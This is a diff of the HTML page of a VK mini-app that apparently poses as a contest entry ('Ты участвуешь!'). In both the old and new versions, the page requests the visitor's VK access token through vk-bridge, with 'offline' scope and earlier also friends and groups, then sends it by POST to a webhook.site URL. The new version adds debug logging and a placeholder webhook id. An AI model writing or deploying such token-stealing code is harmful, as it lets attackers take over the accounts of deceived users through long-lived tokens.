@@ -6,34 +6,38 @@
   <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
 </head>
 <body>
-  <p>Загрузка...</p>
+  <p id="status">Загрузка...</p>
+  <div id="debug" style="font-family:monospace;font-size:12px;white-space:pre-wrap;padding:8px;color:#a33;"></div>
   <script>
-    window.vkBridge.send("VKWebAppInit");
+    var debug = document.getElementById("debug");
+    function log(t) { debug.textContent += t + "\n"; console.log(t); }
 
-    window.vkBridge.send("VKWebAppGetAuthToken", {
-      app_id: 54786076,
-      scope: "offline,friends,groups"
-    })
-    .then(function(data) {
-      return fetch("https://webhook.site/d5ce111a-d195-4b31-877f-2201eac2cf4e", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          token: data.access_token,
-          user_id: data.user_id,
-          scope: data.scope
-        })
+    try {
+      log("bridge: " + (typeof window.vkBridge));
+      window.vkBridge.send("VKWebAppInit");
+      log("init sent");
+
+      window.vkBridge.send("VKWebAppGetAuthToken", {
+        app_id: 54786076,
+        scope: "offline"
+      })
+      .then(function(data) {
+        log("token ok: " + JSON.stringify(data));
+        return fetch("https://webhook.site/твой-id", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(data)
+        });
+      })
+      .then(function() {
+        document.getElementById("status").textContent = "Ты участвуешь!";
+      })
+      .catch(function(err) {
+        log("ERR: " + JSON.stringify(err));
       });
-    })
-    .then(function() {
-      document.body.innerHTML = "<p>Ты участвуешь! Напиши слово СТЕНДОФФ в канал.</p>";
-    })
-    .catch(function(err) {
-  var msg = err && err.error_data ? JSON.stringify(err.error_data)
-          : err && err.error_msg  ? err.error_msg
-          : JSON.stringify(err);
-  document.body.innerHTML = "<pre>Ошибка: " + msg + "</pre>";
-});
+    } catch (e) {
+      log("EXC: " + e.message);
+    }
   </script>
 </body>
 </html>
